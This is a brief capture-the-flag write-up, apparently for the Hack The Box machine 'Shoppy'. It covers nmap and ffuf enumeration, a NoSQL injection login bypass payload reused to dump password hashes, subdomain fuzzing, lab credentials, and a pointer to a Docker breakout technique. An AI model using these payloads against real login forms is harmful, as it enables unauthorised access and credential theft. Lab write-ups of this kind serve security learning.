# Overview

## OWASP Top 10 

- [A04 Insecure Design - OWASP Top 10:2021](https://owasp.org/Top10/A04_2021-Insecure_Design/)
- [A07 Identification and Authentication Failures - OWASP Top 10:2021](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)

# Initial Enumeration
- Start with the standard nmap scan of `nmap -p- -sV -sC $IP -T4 -vv -oN basic_nmap`
login
page at `/login`
![](Pasted%20image%2020221204165958.png)
* fuzz it a bunch - hits on NoSQL.txt
* ![](Pasted%20image%2020221204165841.png)
* `ffuf -u http://shoppy.htb/login -c -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -X POST -d 'username=adminFUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded'`
* use `admin' || 'a'=='a` in the username field - any pass is fine
* ![](Pasted%20image%2020221204170128.png)

## Enumerating admin portal
* has user search function
* has download export function
* ![](Pasted%20image%2020221204170257.png)
* ![](Pasted%20image%2020221204170306.png)
* try same payload in search
* ![](Pasted%20image%2020221204170458.png)
	* `6ebcea65320589ca4f2f1ce039975995` - probably md5??
	* `remembermethisway`

# User Josh
* ssh doesnt work
* no other open ports that could be used to login but there was the 'beta' site reference on the landing page
	* ![](Pasted%20image%2020221204170757.png)
	* subdomain enum??
	* `ffuf -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.shoppy.htb" -fs 169`
	* negative response return w/response size 169
	* ![](Pasted%20image%2020221204183037.png)
	* username: jaeger // password: Sh0ppyBest@pp!
	* ![](Pasted%20image%2020221204183132.png)
	* ![](Pasted%20image%2020221204183240.png)
	* creds fail for the password-manager
	* ![](Pasted%20image%2020221204183358.png)
	* ![](Pasted%20image%2020221204183420.png)
	* `Sample` works for the master pass
	* ![](Pasted%20image%2020221204183513.png)
	* ![](Pasted%20image%2020221204183547.png)
	* https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
	* ![](Pasted%20image%2020221204183624.png)
	* ![](Pasted%20image%2020221204183649.png)



